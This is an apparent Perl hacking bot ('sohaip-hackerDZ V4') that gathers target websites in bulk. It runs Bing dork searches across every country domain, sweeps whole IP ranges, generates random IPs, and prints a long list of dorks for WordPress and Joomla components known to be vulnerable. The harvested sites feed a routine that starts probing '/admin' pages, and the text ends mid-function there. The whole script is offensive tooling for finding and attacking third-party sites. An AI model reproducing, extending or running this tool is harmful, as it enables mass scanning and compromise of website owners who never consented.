#!/usr/bin/perl

use IO::Select;
use HTTP::Response;
use HTTP::Request::Common qw(GET);
use URI::URL;
use IO::Socket::INET;
use Term::ANSIColor qw(:constants);
use MIME::Base64;
use LWP;
use HTTP::Cookies;
use HTML::Entities;
use URI::Escape;
use Term::ANSIColor;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
use LWP::UserAgent;
use HTTP::Request::Common;
use Term::ANSIColor;
use HTTP::Request::Common qw(GET);
$ag = LWP::UserAgent->new();
use MIME::Base64;


    print color('reset');
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }

$mrspy ="
___________________________


     Bot sohaip-hackerDZ V4
___________________________\n\n
";

    print color('bold red');

print $mrspy;

    print color('reset');

    print color('bold white');
    print color('reset');
print color("bold Green"), "Coded By sohaip-hackerDZ V4 Just Run Me and See The magic\n";
print color 'reset';
print color("bold yellow"),"Contact me facebook.com/sohaib.gov.dz \n\n";
print color 'reset';
print color("bold white"),"Do u Have List Of Sites ? \n1-Yes \n2-No  \n3-Beast Mode Vol. 2\n";
print color 'reset';

my $whatspywant = <STDIN>;
chomp $whatspywant;



if($whatspywant eq '1'){
bot();
}
if($whatspywant eq '2'){
bing();
}
if($whatspywant eq '3'){
spyx1();
spyx2();

}



sub bing(){
system('cls');


$logo="
  ____  _               _____             _             
 |  _ \(_)             |  __ \           | |            
 | |_) |_ _ __   __ _  | |  | | ___  _ __| | _____ _ __ 
 |  _ <| | '_ \ / _` | | |  | |/ _ \| '__| |/ / _ \ '__|
 | |_) | | | | | (_| | | |__| | (_) | |  |   <  __/ |   
 |____/|_|_| |_|\__, | |_____/ \___/|_|  |_|\_\___|_|   
                  __/ |                                  
                 |___/                                                     
";
print $logo;

print color("green"), "[1] World Wide     |> World Wide Grabber\n";
print color("green"), "[2] Mass Site Dump |> By Ip or Websites List\n";
print color("green"), "[3] Mass Site Dump |> Range Ip by Ip or Wbesite list\n";
print color("green"), "[4] i'm Idiot And I Don't Know What To Do \n";
print color("green"), "[5] Random Ip Genrator \n";
my $targett = <STDIN>;
chomp $targett;



if($targett eq '1')
{
print "[Just Put Your Dork And I will Scan All World Sites Area ]\n";
print "Give Me Dork:";
$dor=<STDIN>;
chomp($dor);
$dor=~s/ /+/g;

@country= ("af","al","dz","as","ad","ao","ai","aq","ag","ar","am","aw","au","at","az","bs","bh","bd","bb","by","be","bz","bj","bm","bt","bo","ba","bw","bv","br","io","bn","bg","bf","bi","kh","cm","ca","cv","ky","cf","td","cl","cn","cx","cc","co","km","cg","cd","ck","cr","ci","hr","cy","cz","dk","dj","dm","do","tl","ec","eg","sv","gq","er","ee","et","fk","fo","fj","fi","fr","gf","pf","tf","ga","gm","ge","de","gh","gi","gr","gl","gd","gp","gu","gt","gn","gw","gy","ht","hm","hn","hk","hu","is","in","id","iq","ie","il","it","jm","jp","jo","kz","ke","ki","kw","kg","la","lv","lb","ls","lr","ly","li","lt","lu","mo","mk","mg","mw","my","mv","ml","mt","mh","mq","mr","mu","yt","mx","fm","md","mc","mn","ms","ma","mz","na","nr","np","nl","an","nc","nz","ni","ne","ng","nu","nf","mp","no","om","pk","pw","ps","pa","pg","py","pe","ph","pn","pl","pt","pr","qa","re","ro","ru","rw","kn","lc","vc","ws","sm","st","sa","sn","cs","sc","sl","sg","sk","si","sb","so","za","gs","kr","es","lk","sh","pm","sr","sj","sz","se","ch","tw","tj","tz","th","tg","tk","to","tt","tn","tr","tm","tc","tv","ug","ua","ae","gb","us","um","uy","uz","vu","va","ve","vn","vg","vi","wf","eh","ye","zm","zw");

OUTER: foreach $country(@country){
chomp $country;
$dork="$dor+site:$country";
print color("yellow"),"[Country : ";
print color('reset');
print color("white"),"$country]\n";
print color('reset');
gassone();
}
}


if($targett eq '2')
{
print "[Put A Ip List path or websites BUT websites should be www.site.com without http : ... ]\n";
print " Path to your websites list:";
my $list=<STDIN>;
chomp($list);
  open (THETARGET, "<$list") || die "Not Found";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;



OUTER: foreach $tofuck(@TARGETS){
chomp($tofuck);
if($tofuck =~ /http:\/\/(.*)\//) {
$tofuck= $1;
get();
}else{
get();
}

}


}
if($targett eq '3')
{
spyx2();
sub spyx2(){
print "[Put A Ip List chen3a.txt]\n";
print " Path to your websites list:";
my $list=<STDIN>;
chomp($list);

  open (THETARGET, "<$list") || die "Not Found";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;



OUTER: foreach $tofuck(@TARGETS){
chomp($tofuck);
if($tofuck =~ /http:\/\/(.*)\//) {
$tofuck= $1;
gett();

}else{
gett();
}

}
}
}


if($targett eq '4')
{
print ("
            Drupal Dorks: 
user/login powered by drupal
user/login
node/1
node/1
node/add/page
?q=user/1
?q=user/2
?q=user/3
?q=user/4
?q=user/5
            Wordpress Dorks :
inurl:/wp-content/plugins/gravityforms/
/wp-content/plugins/gravityforms/
index of /wp-content/uploads/gravity_forms/
inurl:/wp-content/uploads/gravity_forms/
inurl:/wp-content/plugins/gravityforms/
inurl:wp-content/plugins/revslider/
inurl:revslider
inurl:revslider_admin.php
inurl:revslider_front.php
inurl:plugins/revslider/
intext:Powered by Revslider
intitle:Index Of/ revslider
intitle:Index Of/wp-content/plugins/revslider
intitle:Index Of/admin/revslider
Index Of/admin/revslider
Index Of/wp-content/plugins/revslider
Index Of/ revslider
revslider_admin.php
inurl:dhia_jridi
/wp-admin/admin-post.php?page=wysija
admin-post.php?page=wysija 
                Joomla Dorks :
inurl:/index.php?option=com_jce
index.php?option=com_jce
index.php?option=com_aardvertiser
index.php?option=com_akobook
index.php?option=com_abbrev
index.php?option=com_gk3_photoslide
index.php?option=com_abc
index.php?option=com_aclassf
index.php?option=com_acprojects
index.php?option=com_acstartseite
index.php?option=com_acteammember
index.php?option=com_actions
index.php?option=com_acymailing
index.php?option=com_addressbook
index.php?option=com_adds
index.php?option=com_rsticketspro
index.php?option=com_adsmanager
index.php?option=com_advertising
index.php?option=com_ag_vodmatvil
index.php?option=com_agency
index.php?option=com_agenda
index.php?option=com_ajaxchat
index.php?option=com_alameda
index.php?option=com_alfresco
index.php?option=com_alfurqan15x
index.php?option=com_allcinevid
index.php?option=com_traxartist
index.php?option=com_flippingbook
index.php?option=com_amblog
index.php?option=com_aml_2
index.php?option=com_annonces
index.php?option=com_appointinator
index.php?option=com_appointment
index.php?option=com_aprice
index.php?option=com_arcadegames
index.php?option=com_archeryscores
index.php?option=com_articleman
index.php?option=com_articlemanager
index.php?option=com_autartimonial
index.php?option=com_avosbillets
index.php?option=com_awiki
index.php?option=com_uhp
index.php?option=com_beamospetition
index.php?option=com_beamspetition
index.php?option=com_bfquiztrial
index.php?option=com_bfsurvey
index.php?option=com_bfsurvey_basic
index.php?option=com_bfsurvey_pro
index.php?option=com_biblestudy
index.php?option=com_biblioteca
index.php?option=com_bidding
index.php?option=com_billyportfolio
index.php?option=com_blog
index.php?option=com_blogfactory
index.php?option=com_book
index.php?option=com_bookflip
index.php?option=com_booklibrary
index.php?option=com_btg_oglas
index.php?option=com_caddy
index.php?option=com_calcbuilder
index.php?option=com_calendario
index.php?option=com_canteen
index.php?option=com_carman
index.php?option=com_cartikads
index.php?option=com_cartweberp
index.php?option=com_casino
index.php?option=com_category
index.php?option=com_cbe
index.php?option=com_cbresumebuilder
index.php?option=com_ccboard
index.php?option=com_ccinvoices
index.php?option=com_ccnewsletter
index.php?option=com_ccrowdsource
index.php?option=com_cgtestimonial
index.php?option=com_chronocontact
index.php?option=com_clan
index.php?option=com_clanlist
index.php?option=com_clantools
index.php?option=соm_рhilаfоrm
index.php?option=com_easybook
index.php?option=com_simpleboard
index.php?option=com_admin
index.php?option=com_htmlarea3_xtd-c
index.php?option=com_sitemap
index.php?option=com_ewriting
index.php?option=com_performs
index.php?option=com_forum
index.php?option=com_productshowcase
index.php?option=com_menus
index.php?option=com_musica
index.php?option=com_colorlab
index.php?option=com_community
index.php?option=com_comp
index.php?option=com_componen
index.php?option=com_component
index.php?option=com_connect
index.php?option=com_content
index.php?option=com_contentbloglist
index.php?option=com_countries
index.php?option=com_crowdsource
index.php?option=com_cvmaker
index.php?option=com_dailymeals
index.php?option=com_dashboard
index.php?option=com_dateconverter
index.php?option=com_datsogallery
index.php?option=com_myalbum
index.php?option=com_dcnews
index.php?option=com_delicious
index.php?option=com_diary
index.php?option=com_digifolio
index.php?option=com_digistore
index.php?option=com_dioneformwizard
index.php?option=com_dir
index.php?option=com_discussions
index.php?option=com_djclassifieds
index.php?option=com_dms
index.php?option=com_doqment
index.php?option=com_drawroot
index.php?option=com_dshop
index.php?option=com_education_classess
index.php?option=com_elite_experts
index.php?option=com_eportfolio
index.php?option=com_equipment
index.php?option=com_esearch
index.php?option=com_event
index.php?option=com_eventcal
index.php?option=com_eventing
index.php?option=com_extcalendar
index.php?option=com_mospray
index.php?option=com_smf
index.php?option=com_pollxt
index.php?option=com_ezautos
index.php?option=com_loudmounth
index.php?option=com_videodb
index.php?option=com_ezine
index.php?option=com_family
index.php?option=com_fastball
index.php?option=com_fireboard
index.php?option=com_flashgames
index.php?option=com_flexicontent
index.php?option=com_flipwall
index.php?option=com_football
index.php?option=com_forme
index.php?option=com_fss
index.php?option=com_g2bridge
index.php?option=com_gambling
index.php?option=com_gamesbox
index.php?option=com_gantry
index.php?option=com_gbufacebook
index.php?option=com_gds
index.php?option=com_gigfe
index.php?option=com_golfcourseguide
index.php?option=com_google
index.php?option=com_graphics
index.php?option=com_grid
index.php?option=com_gsticketsystem
index.php?option=com_guide
index.php?option=com_hbssearch
index.php?option=com_hdflvplayer
index.php?option=com_hdvideoshare
index.php?option=com_hello
index.php?option=com_hezacontent
index.php?option=com_hitexam
index.php?option=com_hmcommunity
index.php?option=com_horoscope
index.php?option=com_hotbrackets
index.php?option=com_huruhelpdesk
index.php?option=com_if_nexus
index.php?option=com_ijoomla_archive
index.php?option=com_ijoomla_rss
index.php?option=com_img
index.php?option=com_immobilien
index.php?option=com_include
index.php?option=com_intuit
index.php?option=com_iotaphotogallery
index.php?option=com_iproperty
index.php?option=com_ircmbasic
index.php?option=com_itarmory
index.php?option=com_items
index.php?option=com_jacomment
index.php?option=com_jashowcase
index.php?option=com_javoice
index.php?option=com_jbook
index.php?option=com_jbpublishdownfp
index.php?option=com_jce
index.php?option=com_jcollection
index.php?option=com_jdirectory
index.php?option=com_jdownloads
index.php?option=com_jdrugstopics
index.php?option=com_jeajaxeventcalendar
index.php?option=com_jeauto
index.php?option=com_jedirectory
index.php?option=com_jeemaarticlecollection
index.php?option=com_jeemasms
index.php?option=com_jefaqpro
index.php?option=com_jeguestbook
index.php?option=com_jepoll
index.php?option=com_jequoteform
index.php?option=com_jesectionfinder
index.php?option=com_jestory
index.php?option=com_jesubmit
index.php?option=com_jfuploader
index.php?option=com_jgen
index.php?option=com_jim
index.php?option=com_jimtawl
index.php?option=com_jinc
index.php?option=com_jlord_rss
index.php?option=com_jmsfileseller
index.php?option=com_jnewsletter
index.php?option=com_jnewspaper
index.php?option=com_job
index.php?option=com_jomdocs
index.php?option=com_jomestate
index.php?option=com_jomsocial
index.php?option=com_jomtube
index.php?option=com_joomdle
index.php?option=com_joomdocs
index.php?option=com_joomgalleryfunc
index.php?option=com_joomlaconnect_be
index.php?option=com_joomlaflashfun
index.php?option=com_joomlaflickr
index.php?option=com_joomlaupdater
index.php?option=com_joomla-visites
index.php?option=com_joommail
index.php?option=com_joomnik
index.php?option=com_joomportfolio
index.php?option=com_joomtouch
index.php?option=com_jp_jobs
index.php?option=com_jphone
index.php?option=com_jpodium
index.php?option=com_j-projects
index.php?option=com_jquarks4s
index.php?option=com_jreactions
index.php?option=com_jreservation
index.php?option=com_jscalendar
index.php?option=com_jshop
index.php?option=com_jstore
index.php?option=com_jsubscription
index.php?option=com_jsupport
index.php?option=com_jtickets
index.php?option=com_jtm
index.php?option=com_jukebox
index.php?option=com_juliaportfolio
index.php?option=com_jwhmcs
index.php?option=com_k2
index.php?option=com_king
index.php?option=com_kk
index.php?option=com_konsultasi
index.php?option=com_ksadvertiser
index.php?option=com_kunena
index.php?option=com_lead
index.php?option=com_leader
index.php?option=com_libros
index.php?option=com_listbingo
index.php?option=com_listing
index.php?option=com_lovefactory
index.php?option=com_lyftenbloggie
index.php?option=com_maianmedia
index.php?option=com_manager
index.php?option=com_market
index.php?option=com_magazine
index.php?option=com_marketplace
index.php?option=com_markt
index.php?option=com_matamko
index.php?option=com_mdigg
index.php?option=com_media_library
index.php?option=com_mediamall
index.php?option=com_mediqna
index.php?option=com_memory
index.php?option=com_menu
index.php?option=com_mochigames
index.php?option=com_mosres
index.php?option=com_mtfireeagle
index.php?option=com_mtree
index.php?option=com_multimap
index.php?option=com_multiroot
index.php?option=com_mamml
index.php?option=com_mycar
index.php?option=com_mycontent
index.php?option=com_myfiles
index.php?option=com_myhome
index.php?option=com_mysms
index.php?option=com_na_content
index.php?option=com_na_newsdescription
index.php?option=com_nicetalk
index.php?option=com_network
index.php?option=com_newsletter
index.php?option=com_fq
index.php?option=com_newsfeeds
index.php?option=com_nfnaddressbook
index.php?option=com_ninjamonials
index.php?option=com_noticeboard
index.php?option=com_noticias
index.php?option=com_obsuggest
index.php?option=com_oprykningspoint_mc
index.php?option=com_ops
index.php?option=com_otzivi
index.php?option=com_oziogallery2
index.php?option=com_packages
index.php?option=com_pandafminigames
index.php?option=com_pandarminigames
index.php?option=com_pbbooking
index.php?option=com_pc
index.php?option=com_securityimages
index.php?option=com_artlinks
index.php?option=com_people
index.php?option=com_perchagallery
index.php?option=com_galleria
index.php?option=com_phocadocumentation
index.php?option=com_phocagallery
index.php?option=com_photobattle
index.php?option=com_photomapgallery
index.php?option=com_php
index.php?option=com_picsell
index.php?option=com_portfol
index.php?option=com_portfolio
index.php?option=com_powermail
index.php?option=com_press
index.php?option=com_prime
index.php?option=com_pro_desk
index.php?option=com_properiesaid
index.php?option=com_propertylab
index.php?option=com_question
index.php?option=com_quickfaq
index.php?option=com_radio
index.php?option=com_record
index.php?option=com_restaurant
index.php?option=com_restaurantmenumanager
index.php?option=com_rokmodule
index.php?option=com_rsappt_pro
index.php?option=com_rsappt_pro2
index.php?option=com_rscomments
index.php?option=com_rsform
index.php?option=com_rsgallery2
index.php?option=com_rssreader
index.php?option=com_s2clanroster
index.php?option=com_sar_news
index.php?option=com_science
index.php?option=com_searchlog
index.php?option=com_sebercart
index.php?option=com_serie
index.php?option=com_sermonspeaker
index.php?option=com_seyret
index.php?option=com_simplefaq
index.php?option=com_simpleshop
index.php?option=com_smartsite
index.php?option=com_socialads
index.php?option=com_software
index.php?option=com_solution
index.php?option=com_soundset
index.php?option=com_serverstat
index.php?option=com_spa
index.php?option=com_spartsite
index.php?option=com_spec
index.php?option=com_spielothek
index.php?option=com_sportfusion
index.php?option=com_spsnewsletter
index.php?option=com_sqlreport
index.php?option=com_start
index.php?option=com_staticxt
index.php?option=com_surveymanager
index.php?option=com_svmap
index.php?option=com_sweetykeeper
index.php?option=com_tariff
index.php?option=com_teacher
index.php?option=com_team
index.php?option=com_teams
index.php?option=com_techfolio
index.php?option=com_television
index.php?option=com_tender
index.php?option=com_timereturns
index.php?option=com_timetrack
index.php?option=com_topmenu
index.php?option=com_tour
index.php?option=com_tpjobs
index.php?option=com_trabalhe_conosco
index.php?option=com_trading
index.php?option=com_travelbook
index.php?option=com_ttvideo
index.php?option=com_tupinambis
index.php?option=com_ultimateportfolio
index.php?option=com_units
index.php?option=com_universal
index.php?option=com_users
index.php?option=com_vat
index.php?option=com_vehiclemanager
index.php?option=com_vid
index.php?option=com_vikrealestate
index.php?option=com_vjdeo
index.php?option=com_vxdate
index.php?option=com_wallpapers
index.php?option=com_weblinks
index.php?option=com_webtv
index.php?option=com_wgpicasa
index.php?option=com_wmi
index.php?option=com_wmptic
index.php?option=com_wmtpic
index.php?option=com_wrapper
index.php?option=com_xcloner-backupandrestore
index.php?option=com_xevidmegahd
index.php?option=com_xgallery
index.php?option=com_xmovie
index.php?option=com_yanc
index.php?option=com_yvhotels
index.php?option=com_zimbcomment
index.php?option=com_zimbcore
index.php?option=com_zina
index.php?option=com_zoom
index.php?option=com_zoomprotfolio
index.php?option=com_fm
index.php?option=phocaguestbook
index.php?option=mailto
index.php?option=con_extplorer
index.php?option=com_worldrates
index.php?option=com_glossary
index.php?option=com_musepoes
index.php?option=com_buslicense
index.php?option=com_recipes
index.php?option=com_jokes
index.php?option=com_estateagent
index.php?option=com_catalogshop
index.php?option=com_akogallery
index.php?option=com_garyscookbook
index.php?option=com_flyspray
index.php?option=com_hashcash
index.php?option=com_mambads
index.php?option=com_hotproperty
index.php?option=com_directory
index.php?option=com_awesom
index.php?option=com_shambo2
index.php?option=com_downloads
index.php?option=com_peoplebook
index.php?option=com_guest
index.php?option=com_quote
index.php?option=com_gallery
index.php?option=com_neogallery
index.php?option=com_comments
index.php?option=com_rapidrecipe
index.php?option=com_board
index.php?option=com_xfaq
index.php?option=com_paxxgallery
index.php?option=com_quiz
index.php?option=com_ricette
index.php?option=com_jooget
index.php?option=com_jotloader
index.php?option=com_jradio
index.php?option=com_jquarks
index.php?option=com_sponsorwall
index.php?option=com_registration
index.php?option=com_zoomportfolio
index.php?option=com_dirfrm
index.php?option=com_jgrid
index.php?option=com_ongallery
index.php?option=com_neorecruit
index.php?option=com_joomla
index.php?option=com_youtube
index.php?option=com_sar
index.php?option=com_jsjobs
index.php?option=com_beeheard
index.php?option=com_activehelper
index.php?option=com_camp
index.php?option=com_awdwall
index.php?option=com_joltcard
index.php?option=com_if
index.php?option=com_gadgetfactory
index.php?option=com_qpersonel
index.php?option=com_mv
index.php?option=com_weberpcustomer
index.php?option=com_articles
index.php?option=com_webeecomment
index.php?option=com_xobbix
index.php?option=com_loginbox
index.php?option=com_shoutbox
index.php?option=com_dwgraphs
index.php?option=com_xmap
index.php?option=com_business
index.php?option=com_departments
index.php?option=com_smestorage
index.php?option=com_aml
index.php?option=com_flash
index.php?option=com_jwmmxtd
index.php?option=com_giftexchange
index.php?option=com_jeformcr
index.php?option=com_org
index.php?option=com_about
index.php?option=com_color
index.php?option=com_party
index.php?option=com_liveticker
index.php?option=com_joomlaconnect
index.php?option=com_communitypolls
index.php?option=com_videos
index.php?option=com_productbook
index.php?option=com_photoblog
index.php?option=com_jequizmanagement
index.php?option=com_biographies
index.php?option=com_gurujibook
index.php?option=com_gameserver
index.php?option=com_jvideodirect
index.php?option=com_rd
index.php?option=com_artistavenue
index.php?option=com_airmonoblock
index.php?option=com_dhforum
index.php?option=com_trabalhe
index.php?option=com_oprykningspoint
index.php?option=com_adagency
index.php?option=com_morfeoshow
index.php?option=com_mediaslide
index.php?option=com_jcalpro
index.php?option=com_zcalendar
index.php?option=com_acmisc
index.php?option=com_virtuemart
index.php?option=com_docman
index.php?option=com_joomgallery
index.php?option=com_mojo
index.php?option=com_joaktree
index.php?option=com_mygallery
index.php?option=Com_Joomclip
index.php?option=com_mytube
index.php?option=com_jbudgetsmagic
index.php?option=com_rsmonials
index.php?option=com_cmimarketplace
index.php?option=com_mailto
index.php?option=com_maianmusic
index.php?option=com_pcchess
index.php?option=com_prod
index.php?option=com_waticketsystem
index.php?option=com_news
index.php?option=com_pccookbook
index.php?option=com_fantasytournament
index.php?option=com_camelcitydb
index.php?option=com_paxgallery
index.php?option=com_ice
index.php?option=com_livechat
index.php?option=com_feederator
index.php?option=com_competitions
index.php?option=com_clickheat
index.php?option=com_dailymessage
index.php?option=com_ignitegallery
index.php?option=com_joomtracker
index.php?option=com_hotspots
index.php?option=com_is
index.php?option=com_gameq
index.php?option=com_prayercenter
index.php?option=com_webhosting
index.php?option=com_alphacontent
index.php?option=com_filiale
index.php?option=com_extplorer
index.php?option=com_actualite
index.php?option=com_d
index.php?option=com_astatspro
index.php?option=com_search
index.php?option=com_expose
index.php?option=com_philaform
index.php?option=com_mosmedia
index.php?option=com_thopper
index.php?option=com_resman
index.php?option=com_poll
index.php?option=com_kochsuite
index.php?option=com_linkdirectory
index.php?option=com_lmo
index.php?option=com_rss
index.php?option=com_oziogallery
index.php?option=com_noticia
index.php?option=com_kkcontent
index.php?option=com_jphoto
index.php?option=com_quicknews
index.php?option=com_musicgallery
index.php?option=com_pinboard
index.php?option=com_amocourse
index.php?option=com_jfusion
index.php?option=com_misterestate
index.php?option=com_tpdugg
index.php?option=com_alphauserpoints
index.php?option=com_foobla
index.php?option=com_jlord
index.php?option=com_facebook
index.php?option=com_groupjive
index.php?option=com_jd
index.php?option=com_recerca
index.php?option=com_icrmbasic
index.php?option=com_album
index.php?option=com_lucygames
index.php?option=com_siirler
index.php?option=com_idoblog
index.php?option=com_pms
index.php?option=com_jobline
index.php?option=com_K
index.php?option=com_jumi
index.php?option=com_ijoomla
index.php?option=com_media
index.php?option=com_omphotogallery
index.php?option=com_seminar
index.php?option=com_jvideo
index.php?option=com_agoragroup
index.php?option=Com_Agora
index.php?option=com_rsgallery
index.php?option=com_bsadv
index.php?option=com_djiceshoutbox
index.php?option=com_rdautos
index.php?option=com_na
index.php?option=com_simple
index.php?option=com_allhotels
index.php?option=com_volunteer
index.php?option=com_tech
index.php?option=com_mydyngallery
index.php?option=com_jmovies
index.php?option=com_thyme
index.php?option=com_catalogproduction
index.php?option=com_contactinfo
index.php?option=com_jb
index.php?option=com_dadamail
index.php?option=com_ongumatimesheet
index.php?option=com_googlebase
index.php?option=com_treeg
index.php?option=com_ab
index.php?option=com_kbase
index.php?option=com_ionfiles
index.php?option=com_ds
index.php?option=com_mad
index.php?option=com_imagebrowser
index.php?option=com_user
index.php?option=com_ezstore
index.php?option=com_products
index.php?option=com_propertiesaid
index.php?option=com_qcontacts
index.php?option=com_quran
index.php?option=com_races
index.php?option=com_ranking
index.php?option=com_rd_download
index.php?option=com_realestatemanager
index.php?option=com_realtyna
index.php?option=com_redshop
index.php?option=com_remository
index.php?option=com_restaurantguide
index.php?option=com_rokdownloads
index.php?option=com_route
index.php?option=com_rwcards
index.php?option=com_s5clanroster
index.php?option=com_sbsfile
index.php?option=com_school
index.php?option=com_schools
index.php?option=com_dtregister
index.php?option=com_n
index.php?option=com_altas
index.php?option=com_vr
index.php?option=com_brightweblinks
index.php?option=com_versioning
index.php?option=com_xewebtv
index.php?option=com_jabode
index.php?option=com_netinvoice
index.php?option=com_expshop
index.php?option=com_yvcomment
index.php?option=com_joomladate
index.php?option=com_joomradio
index.php?option=com_eQuotes
index.php?option=com_acctexp
index.php?option=com_joobb
index.php?option=com_artist
index.php?option=com_xsstream
index.php?option=com_comprofiler
index.php?option=com_jpad
index.php?option=com_joomlaxplorer
index.php?option=com_onlineflashquiz
index.php?option=com_rekry
index.php?option=com_custompages
index.php?option=com_galeria
index.php?option=com_mcquiz
index.php?option=com_ynews
index.php?option=com_neoreferences
index.php?option=com_candle
index.php?option=com_joovideo
index.php?option=com_alberghi
index.php?option=com_restaurante
index.php?option=com_puarcade
index.php?option=com_jjgallery
index.php?option=com_jcs
index.php?option=com_mp
index.php?option=com_wmtportfolio
index.php?option=com_wmtgallery
index.php?option=com_panoramic
index.php?option=com_slideshow
index.php?option=com_joom
index.php?option=com_joomlaradiov
index.php?option=com_jombib
index.php?option=com_rsfiles
index.php?option=com_eventlist
index.php?option=com_gmaps
index.php?option=com_ponygallery
index.php?option=com_autostand
index.php?option=com_swmenufree
index.php?option=com_joomlaboard
index.php?option=com_webring
index.php?option=com_reporter
index.php?option=com_jeux
index.php?option=com_nfn
index.php?option=com_bayesiannaivefilter
index.php?option=com_doc
index.php?option=com_clasifier
index.php?option=com_hwdvideoshare
index.php?option=com_acajoom
index.php?option=com_facileforms
index.php?option=com_books
index.php?option=com_tophotelmodule
index.php?option=com_lowcosthotels
index.php?option=com_newsflash
index.php?option=com_gigcal
index.php?option=com_flashmagazinedeluxe
index.php?option=com_bookjoomlas
index.php?option=com_juser
index.php?option=com_moofaq
index.php?option=com_portafolio
index.php?option=com_projectfork
index.php?option=com_tickets
index.php?option=com_joomloads
index.php?option=com_ninjamonial
index.php?option=com_jtips
index.php?option=com_artportal
index.php?option=com_joomlub
index.php?option=com_joomloc
index.php?option=com_djcatalog
index.php?option=com_foobla_suggestions
index.php?option=com_reservations
index.php?option=com_chronoconnectivity
index.php?option=com_djartgallery
index.php?option=com_jmarket
index.php?option=com_jcommunity
index.php?option=com_cinema
index.php?option=com_answers
index.php?option=com_galleryxml
index.php?option=com_frontpage
index.php?option=com_google_maps
index.php?option=com_image
index.php?option=com_photos
index.php?option=com_picasa2gallery
index.php?option=com_ybggal
index.php?option=com_jcafe
index.php?option=com_jejob
index.php?option=com_sef
index.php?option=jesubmit
index.php?option=com_projectlog
index.php?option=com_reportcard
index.php?option=com_artforms
index.php?option=com_jomholiday
index.php?option=com_ownbiblio
index.php?option=com_tag
index.php?option=com_commedia
index.php?option=com_conference
index.php?option=com_realty
index.php?option=com_sobi2
index.php?option=com_jomdirectory
index.php?option=com_bnf
index.php?option=com_sport
index.php?option=com_personal
index.php?option=com_play
index.php?option=com_etree
index.php?option=com_file
index.php?option=com_bca-rss-syndicator
index.php?option=com_ckforms
index.php?option=com_datafeeds
index.php?option=com_fabrik
index.php?option=com_ganalytics
index.php?option=com_gcalendar
index.php?option=com_hsconfig
index.php?option=com_if_surfalert
index.php?option=com_janews
index.php?option=com_jfeedback
index.php?option=com_joomlapicasa2
index.php?option=com_jshopping
index.php?option=com_jvehicles
index.php?option=com_linkr
index.php?option=com_mmsblog
index.php?option=com_mscomment
index.php?option=com_ninjarsssyndicator
index.php?option=com_onlineexam
index.php?option=com_orgchart
index.php?option=com_properties
index.php?option=com_rpx
index.php?option=com_sectionex
index.php?option=com_simpledownload
index.php?option=com_userstatus
index.php?option=com_aquiz
index.php?option=com_as
index.php?option=com_as_shop
index.php?option=com_msg
index.php?option=com_club
modules/mod_simplefileuploadv1.3


put all this in file txt === > spy.txt then run script again and choose 1
");

}
if($targett eq '5')
{
spyx1();
sub spyx1(){
srand(time() ^ ($$ + ($$ << 15)));
print "Welcome to the ip Genrator how much ip u want ?\n";
my $ipnumspy = <STDIN>;
chomp $ipnumspy;

for (1..$ipnumspy){
    print $spx = join ('.', (int(rand(255))
                     ,int(rand(255))
                     ,int(rand(255))
                     ,int(rand(255))))

          , "\n";
      open(save, '>>chen3a.txt');
    print save "$spx\n";
    close(save);

}
}
}

else{
print color("red"), "Not Found\n";
print color('reset');
}
##############################
sub gett(){
$ip= (gethostbyname($tofuck))[4];
my ($a,$b,$c,$d) = unpack('C4',$ip);
for ($i = 1; $i <= 255; $i+=1){
$ips ="$a.$b.$c.$i";
OUTER: foreach $ip($ips){
print color("red"), " [IP] > [$ips]\n";
print color ('reset');
        open (TEXT, '>>ipsdumpdv3.txt');
        print TEXT "$ips\n";
        close (TEXT);
$dork="ip:$ips";
gassone();

}
minibot();
open HANDLE,">","tobotv3.txt";
print HANDLE "";
close HANDLE;


}
}
#############################
sub get(){

$ip= (gethostbyname($tofuck))[4];
my ($a,$b,$c,$d) = unpack('C4',$ip);
$ips="$a.$b.$c.$d";
print " [IP] > [$ips]\n";
        open (TEXT, '>>ipsdumpdv3.txt');
        print TEXT "$ips\n";
        close (TEXT);
$dork="ip:$ips";
gassone();
minibot();


}
####################################"
sub gassone(){
for ($ii = 1; $ii <= 2000; $ii+=10){

$url = "http://www.bing.com/search?q=$dork&filt=all&first=$ii&FORM=PERE";
$resp = $ag->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g){



$link = $1;
  if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|yahoo|microsof/)
  {
        if ($link !~ /^http:/)
       {
        $link = 'http://' . "$link" . '/';
       }



if($link !~ /\"|\?|\=|index\.php/){
          if  (!  grep (/$link/,@result))
          {
print "$link\n";
open(save, '>>urldumpdv3.txt');
    print save "$link\n";
    close(save);

print "$link\n";
open(savea, '>>tobotv3.txt');
    print savea "$link\n";
    close(savea);
  

            push(@result,$link);
          }
} 
}
}
####
if ($rrs !~ m/class=\"sb_pagN\"/g){
next OUTER;

open HANDLE,">","tobotv3.txt";
print HANDLE "";
close HANDLE;}
}
}
###########
sub gassonee(){
for ($ii = 1; $ii <= 2000; $ii+=10){

$url = "http://www.bing.com/search?q=$dork&filt=all&first=$ii&FORM=PERE";
$resp = $ag->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g){



$link = $1;
  if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|yahoo|microsof/)
  {
        if ($link !~ /^http:/)
       {
        $link = 'http://' . "$link" . '/';
       }



if($link !~ /\"|\?|\=|index\.php/){
          if  (!  grep (/$link/,@result))
          {
print "$link\n";
open(save, '>>urldumpdv3.txt');
    print save "$link\n";
    close(save);
            push(@result,$link);
          }
} 
}
}
####
if ($rrs !~ m/class=\"sb_pagN\"/g){
exit;
}
}
}
}
sub minibot(){
open(tarrget,"tobotv3.txt") or die "$!";
while(<tarrget>){
chomp($_);
$site = $_;
filter();
open HANDLE,">","tobotv3.txt";
print HANDLE "";
close HANDLE;

}
}

sub bot(){ 
print "List : \n";
$list=<STDIN>;
open(tarrget,"<$list") or die "add list \n";
while(<tarrget>){
chomp($_);
$site = $_;
if($site !~ /https:\/\// && $site !~ /http:\/\// ) { $site = "http://$site/"; };
filter();
}
sub filter($site){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (15);
$magsite = $site . '/admin';
